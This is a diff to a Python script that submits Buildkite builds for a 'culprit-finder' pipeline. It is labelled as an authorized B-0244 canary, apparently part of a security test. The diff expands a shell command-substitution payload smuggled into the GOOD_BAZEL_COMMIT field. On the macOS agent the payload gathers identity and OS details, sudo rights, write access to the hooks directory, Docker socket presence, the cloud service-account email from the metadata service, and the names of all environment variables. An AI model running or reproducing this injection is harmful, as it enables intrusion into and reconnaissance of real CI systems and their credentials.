@@ -13,7 +13,7 @@ NONCE = "hi_from_robert:d21766e5488dc00f"
 CANARY_COMMIT = os.environ.get("BUILDKITE_COMMIT", "HEAD")
 CANARY_BRANCH = "benr00t3d:b0244-buildkite-scope-d21766e5488dc00f"
 CANARY_PIPELINE = "culprit-finder"
-CANARY_MESSAGE = "[authorized B-0244 command canary] " + NONCE
+CANARY_MESSAGE = "[authorized B-0244 mac boundary canary] " + NONCE
 API = "https://api.buildkite.com/v2"
 
 
@@ -171,8 +171,23 @@ def main():
                 "PROJECT_NAME": "Bazel skylib",
                 "TASK_NAME": "run_presubmit_bazel_9_config_01",
                 "GOOD_BAZEL_COMMIT": (
-                    "$(printf 'hi_from_robert:d21766e5488dc00f\\n' >&2; "
-                    "printf 'x --help')"
+                    "$( { "
+                    "printf 'B0244_MAC_BEGIN hi_from_robert:d21766e5488dc00f\\n'; "
+                    "id; uname -a; sw_vers; hostname; uptime; "
+                    "printf 'cwd='; pwd; "
+                    "printf 'sudo_policy='; sudo -n -l 2>&1 || true; "
+                    "printf 'hook_dir_writable='; "
+                    "test -w /opt/homebrew/etc/buildkite-agent/hooks && echo yes || echo no; "
+                    "printf 'docker_socket='; "
+                    "test -S /var/run/docker.sock && echo yes || echo no; "
+                    "printf 'gcloud='; command -v gcloud || echo unavailable; "
+                    "printf 'metadata_sa='; "
+                    "curl --max-time 2 -fsS -H Metadata-Flavor:Google "
+                    "http://metadata.google.internal/computeMetadata/v1/instance/"
+                    "service-accounts/default/email || printf unavailable; printf '\\n'; "
+                    "printf 'env_keys='; env | cut -d= -f1 | sort | tr '\\n' ','; "
+                    "printf '\\nB0244_MAC_END\\n'; "
+                    "} >&2; printf 'x --help')"
                 ),
                 "BAD_BAZEL_COMMIT": "HEAD",
             },
